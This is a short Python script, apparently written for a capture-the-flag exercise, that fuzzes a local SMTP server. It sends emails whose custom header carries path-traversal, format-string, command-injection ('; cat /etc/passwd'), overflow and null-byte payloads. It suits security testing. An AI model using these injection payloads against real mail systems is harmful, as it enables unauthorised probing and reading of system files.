#smtp header fuzzer for a ctf


import smtplib
import os
from email.message import EmailMessage

def send_fuzzing_emails(file_path):
    # Configuration
    smtp_server = "localhost"
    smtp_port = 1025
    fixed_recipient = "e@mail.addr"
    
    # 1. Define Fuzzing Payloads
    # These test for common string handling errors:
    payloads = {
        "Path Traversal": "../../../../etc/passwd",
        "Format String":  "%x%x%x%x%s%p%n",
        "Cmd Injection":  "; cat /etc/passwd",
        "Buffer Overflow": "A" * 4096, # 4KB string
        "Null Byte":      "/token1.txt\0.jpg"
    }

    # 2. Read Senders from file
    if not os.path.exists(file_path):
        print(f"Error: File '{file_path}' not found.")
        return

    with open(file_path, 'r') as f:
        sender_list = [line.strip() for line in f if line.strip()]

    print(f"Loaded {len(sender_list)} senders. Starting fuzzing run...")

    try:
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            
            for sender in sender_list:
                print(f"--- Processing Sender: {sender} ---")
                
                # Loop through each payload for the current sender
                for attack_type, payload_value in payloads.items():
                    try:
                        msg = EmailMessage()
                        msg.set_content(f"Testing header handling.\nSender: {sender}\nType: {attack_type}")
                        msg["Subject"] = f"Security Test: {attack_type}"
                        msg["From"] = sender
                        msg["To"] = fixed_recipient

                        # INJECT MALICIOUS HEADER
                        msg.add_header("X-Lancer-QA", payload_value)

                        server.send_message(msg)
                        print(f"   [SENT] Type: {attack_type}")

                    except Exception as e:
                        print(f"   [FAILED] Type: {attack_type}. Error: {e}")

    except ConnectionRefusedError:
        print(f"CRITICAL: Connection refused at {smtp_server}:{smtp_port}")
    except Exception as e:
        print(f"CRITICAL: {e}")

if __name__ == "__main__":
    send_fuzzing_emails("emails.txt")